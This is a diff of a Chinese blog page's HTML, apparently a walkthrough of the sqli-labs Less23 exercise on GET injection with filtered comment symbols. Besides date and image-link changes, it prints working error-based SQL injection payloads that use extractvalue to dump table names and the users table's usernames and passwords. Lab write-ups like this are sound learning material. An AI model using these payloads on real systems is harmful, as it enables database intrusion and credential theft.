@@ -419,14 +419,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-05-28
+                    2023-05-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    351
+                    348
                 </div>
                 
 
@@ -451,7 +451,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h1><h4 id="1-过滤注释符的Get注入-单引号注入"><a href="#1-过滤注释符的Get注入-单引号注入" class="headerlink" title="1.过滤注释符的Get注入(单引号注入)"></a>1.过滤注释符的Get注入(单引号注入)</h4><p><strong>Mysql注释符号</strong></p>
+                <h1 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h1><h4 id="过滤注释符的Get注入-单引号注入"><a href="#过滤注释符的Get注入-单引号注入" class="headerlink" title="过滤注释符的Get注入(单引号注入)"></a>过滤注释符的Get注入(单引号注入)</h4><p><strong>Mysql注释符号</strong></p>
 <table>
 <thead>
 <tr>
@@ -472,19 +472,20 @@
 <td align="center"><strong>;%00</strong>内容</td>
 </tr>
 </tbody></table>
-<h2 id="2-审计代码"><a href="#2-审计代码" class="headerlink" title="2.审计代码:"></a>2.审计代码:</h2><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281047314.png"><br>发现#和–符号被替换为空，无法使用注释来闭合语句</p>
-<h2 id="3-尝试用–和-注入"><a href="#3-尝试用–和-注入" class="headerlink" title="3.尝试用–和#注入"></a>3.尝试用–和#注入</h2><p>(%23经过URL编码为#)<br><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281047722.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281047071.png"><br><strong>发现#和–都被替换为空了</strong><br><br></p>
-<h3 id="1-可以使用新注释符"><a href="#1-可以使用新注释符" class="headerlink" title="(1)可以使用新注释符"></a>(1)可以使用新注释符</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281047653.png"><br>因为新注释符没有被替换为空</p>
-<h3 id="※※-2-可以使用or来闭合语句"><a href="#※※-2-可以使用or来闭合语句" class="headerlink" title="※※(2)可以使用or来闭合语句"></a>※※(2)可以使用or来闭合语句</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281048999.png"></p>
+<h2 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码:"></a>审计代码:</h2><p><img src="https://s2.loli.net/2023/05/27/N8mc1kOJ56vKh3r.png"><br>发现#和–符号被替换为空，无法使用注释来闭合语句</p>
+<h2 id="尝试用–和-注入"><a href="#尝试用–和-注入" class="headerlink" title="尝试用–和#注入"></a>尝试用–和#注入</h2><p>(%23经过URL编码为#)<br><img src="https://s2.loli.net/2023/05/27/fX24xS1KRk6CT5A.png"></p>
+<p><img src="https://raw.githubusercontent.com/NTrack/blog_img/main/img/202305301219558.png"><br><strong>发现#和–都被替换为空了</strong><br><br></p>
+<h2 id="1-可以使用新注释符"><a href="#1-可以使用新注释符" class="headerlink" title="(1)可以使用新注释符"></a>(1)可以使用新注释符</h2><p>因为新注释符没有被替换为空</p>
+<h2 id="※※-2-可以使用or来闭合语句"><a href="#※※-2-可以使用or来闭合语句" class="headerlink" title="※※(2)可以使用or来闭合语句"></a>※※(2)可以使用or来闭合语句</h2><p><img src="https://raw.githubusercontent.com/NTrack/blog_img/main/img/202305301230726.png"></p>
+<p><img src="https://raw.githubusercontent.com/NTrack/blog_img/main/img/202305301231423.png"></p>
 <blockquote>
 <p>注意:<br>&amp;emsp;存在局限就是<strong>对查询结果进行逻辑运算，返回结果是True或False，无法order by判断字段数</strong>(理解为order by在执行时被忽略了,与Mysql解析顺序有关)</p>
 </blockquote>
-<h3 id="3-使用报错注入"><a href="#3-使用报错注入" class="headerlink" title="(3)使用报错注入"></a>(3)使用报错注入</h3><blockquote>
+<h2 id="3-使用报错注入"><a href="#3-使用报错注入" class="headerlink" title="(3)使用报错注入"></a>(3)使用报错注入</h2><blockquote>
 <p>substr(str,start,len)函数的使用，xpath语句报错每次只能显示32个字符，除去~字符还能显示31个，使用*<em>substr(str,1+31</em>n,31)**来遍历查询结果(n可以为0、1、2…)</p>
 </blockquote>
 <blockquote>
-<p>查询当前数据库:?id&#x3D;1’ or extractvalue(1,concat(0x7e,database())) or ‘<br><br>查询当前数据库的表:?id&#x3D;1’ or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) or ‘<br><br>查询users表的字段名:?id&#x3D;1’ or extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’),<strong>1</strong>,31))) or ‘<br><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281053022.png"><br><br>查询username和password字段:?id&#x3D;1’ or extractvalue(1,concat(0x7e,substr((select group_concat(0x7c,username,0x26,password) from users),<strong>1</strong>,31))) or ‘<br><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img//202305281053157.png"></p>
+<p>查询当前数据库:?id&#x3D;1’ or extractvalue(1,concat(0x7e,database())) or ‘<br><br>查询当前数据库的表:?id&#x3D;1’ or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) or ‘<br><br>查询users表的字段名:?id&#x3D;1’ or extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’),<strong>1</strong>,31))) or ‘<br><img src="https://raw.githubusercontent.com/NTrack/blog_img/main/img/202305301231439.png"><br><br>查询username和password字段:?id&#x3D;1’ or extractvalue(1,concat(0x7e,substr((select group_concat(0x7c,username,0x26,password) from users),<strong>1</strong>,31))) or ‘<br><img src="https://raw.githubusercontent.com/NTrack/blog_img/main/img/202305301231156.png"></p>
 </blockquote>
 
                 
@@ -833,7 +834,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">3.4k</span>&nbsp;字
+                class="white-color">3.3k</span>&nbsp;字
             
             
             
